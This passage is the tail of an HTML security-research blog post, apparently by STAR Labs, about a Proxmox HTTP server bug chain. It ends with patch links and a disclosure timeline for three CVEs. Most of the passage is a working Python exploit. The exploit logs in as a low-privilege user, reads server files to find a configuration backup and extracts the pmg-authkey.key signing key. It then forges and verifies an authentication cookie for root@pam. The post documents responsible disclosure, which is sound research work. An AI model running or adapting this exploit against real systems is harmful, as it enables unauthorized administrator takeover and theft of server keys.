</span></span><span class="line"><span class="cl">    <span class="n">tar</span> <span class="o">=</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">fileobj</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">tgz_bytes</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;reading ./config_backup.tar from tgz&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tar2</span> <span class="o">=</span> <span class="n">tarfile</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">fileobj</span><span class="o">=</span><span class="n">tar</span><span class="o">.</span><span class="n">extractfile</span><span class="p">(</span><span class="n">tar</span><span class="o">.</span><span class="n">getmember</span><span class="p">(</span><span class="s1">&#39;./config_backup.tar&#39;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;reading etc/pmg/pmg-authkey.key from ./config_backup.tar&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">authkey_bytes</span> <span class="o">=</span> <span class="n">tar2</span><span class="o">.</span><span class="n">extractfile</span><span class="p">(</span><span class="n">tar2</span><span class="o">.</span><span class="n">getmember</span><span class="p">(</span><span class="s1">&#39;etc/pmg/pmg-authkey.key&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;read authkey_bytes length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">authkey_bytes</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">authkey_bytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">realm</span><span class="p">,</span> <span class="n">target_url</span><span class="p">,</span> <span class="n">generate_for</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># login</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;logging in with username:</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s1">api2/extjs/access/ticket&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="s1">&#39;realm&#39;</span><span class="p">:</span> <span class="n">realm</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">                        <span class="n">proxies</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;login failed: expect 200, got </span><span class="si">{</span><span class="n">req</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s1">. Please check target_url&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">res</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;login failed: </span><span class="si">{</span><span class="n">res</span><span class="p">[</span><span class="s2">&#34;message&#34;</span><span class="p">]</span><span class="si">}</span><span class="s1">. Please check username/password/realm&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span> <span class="o">=</span> <span class="n">res</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;ticket&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">localhostname_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;PMG:.*?@(.*?):[0-9A-F]</span><span class="si">{8}</span><span class="s1">::&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">localhostname</span> <span class="o">=</span> <span class="n">localhostname_re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">ticket</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;logged in, user: </span><span class="si">{</span><span class="n">res</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="si">}</span><span class="s1">, role: </span><span class="si">{</span><span class="n">res</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;role&#34;</span><span class="p">]</span><span class="si">}</span><span class="s1">, localhostname: </span><span class="si">{</span><span class="n">localhostname</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># read file</span>
</span></span><span class="line"><span class="cl">    <span class="n">parsed_target</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">hostname</span> <span class="o">=</span> <span class="n">parsed_target</span><span class="o">.</span><span class="n">hostname</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="n">parsed_target</span><span class="o">.</span><span class="n">port</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">task_index</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ticket</span><span class="p">,</span> <span class="n">localhostname</span><span class="p">,</span> <span class="s1">&#39;/var/log/pve/tasks/index&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">task_index</span> <span class="o">=</span> <span class="n">task_index</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">backup_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;^(UPID:.*?:backup::.*?) ([0-9A-F]</span><span class="si">{8}</span><span class="s1">) OK$&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">backup_tasks</span> <span class="o">=</span> <span class="n">backup_re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">task_index</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># we start looking for the tgz file from the lastest update</span>
</span></span><span class="line"><span class="cl">    <span class="n">backup_tasks</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">backup_tasks</span><span class="p">)</span><span class="si">}</span><span class="s1"> successful backup tasks&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">backup_tasks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># extract backup tgz filepath from task details</span>
</span></span><span class="line"><span class="cl">        <span class="n">task_detail</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ticket</span><span class="p">,</span> <span class="n">localhostname</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;/var/log/pve/tasks/</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s1">/</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">backuptgz_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;^starting backup to: (.*?\.tgz)$&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">backuptgz_path</span> <span class="o">=</span> <span class="n">backuptgz_re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">task_detail</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">backuptgz_path</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;no backup file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">backuptgz_path</span> <span class="o">=</span> <span class="n">backuptgz_path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;found backup file: </span><span class="si">{</span><span class="n">backuptgz_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># read the backup tgz file and extract pmg-authkey.key</span>
</span></span><span class="line"><span class="cl">        <span class="n">backuptgz_content</span> <span class="o">=</span> <span class="n">read_file</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ticket</span><span class="p">,</span> <span class="n">localhostname</span><span class="p">,</span> <span class="n">backuptgz_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">backuptgz_content</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;no backup file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">backuptgz_content</span> <span class="o">=</span> <span class="n">backuptgz_content</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">authkey_bytes</span> <span class="o">=</span> <span class="n">get_authkey_from_tgz</span><span class="p">(</span><span class="n">backuptgz_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_ticket</span> <span class="o">=</span> <span class="n">generate_ticket</span><span class="p">(</span><span class="n">authkey_bytes</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">generate_for</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;veryfing ticket&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;PMGAuthCookie=</span><span class="si">{</span><span class="n">new_ticket</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">},</span> <span class="n">proxies</span><span class="o">=</span><span class="n">PROXIES</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                           <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">verify_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;UserName: </span><span class="se">\&#39;</span><span class="s1">(.*?)</span><span class="se">\&#39;</span><span class="s1">,</span><span class="se">\n</span><span class="s1">\s+CSRFPreventionToken:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">verify_result</span> <span class="o">=</span> <span class="n">verify_re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;current user: </span><span class="si">{</span><span class="n">verify_result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Cookie: PMGAuthCookie=</span><span class="si">{</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">new_ticket</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_parse_args</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;A low privilege account in PMG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;realm&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&#34;pmg&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Default: pmg&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-g&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;generate_for&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&#34;root@pam&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Default: root@pam&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-t&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;target_url&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Please keep the trailing slash, example: https://10.0.0.24:8006/&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">arg</span> <span class="o">=</span> <span class="n">_parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">(</span><span class="n">arg</span><span class="o">.</span><span class="n">u</span><span class="p">,</span> <span class="n">arg</span><span class="o">.</span><span class="n">p</span><span class="p">,</span> <span class="n">arg</span><span class="o">.</span><span class="n">r</span><span class="p">,</span> <span class="n">arg</span><span class="o">.</span><span class="n">t</span><span class="p">,</span> <span class="n">arg</span><span class="o">.</span><span class="n">g</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="patch-2">Patch<a hidden class="anchor" aria-hidden="true" href="#patch-2">#</a></h3>
<p>There are several commits applied in <code>pve-http-server</code> version <code>4.1-3</code> to fix the bug chain.</p>
<ul>
<li><a href="https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=580d540ea907ba15f64379c5bb69ecf1a49a875f">https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=580d540ea907ba15f64379c5bb69ecf1a49a875f</a></li>
<li><a href="https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=e9df8a6e76b2a18f89295a5d92a62177bbf0f762">https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=e9df8a6e76b2a18f89295a5d92a62177bbf0f762</a></li>
<li><a href="https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=c2bd69c7b5e9c775f96021cf8ae53da3dbd9029d">https://git.proxmox.com/?p=pve-http-server.git;a=commitdiff;h=c2bd69c7b5e9c775f96021cf8ae53da3dbd9029d</a></li>
</ul>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2022-05-17 Reported the XSS vulnerability to vendor</li>
<li>2022-05-17 Vendor acknowledged and patched XSS</li>
<li>2022-06-16 CVE-2022-31358 assigned to the XSS vulnerability</li>
<li>2022-07-01 Reported CRLF injection and SSRF to vendor</li>
<li>2022-07-02 Vendor acknowledged and patched both vulnerabilities</li>
<li>2022-07-06 Submitted CVE ID request form for CRLF injection and SSRF, no reply from MITRE since then</li>
<li>2022-09-03 Emailed MITRE but no reply again</li>
<li>2022-12-09 MITRE emailed back and assigned CVE-2022-35507 &amp; CVE-2022-35508 for the remaining 2 bugs</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
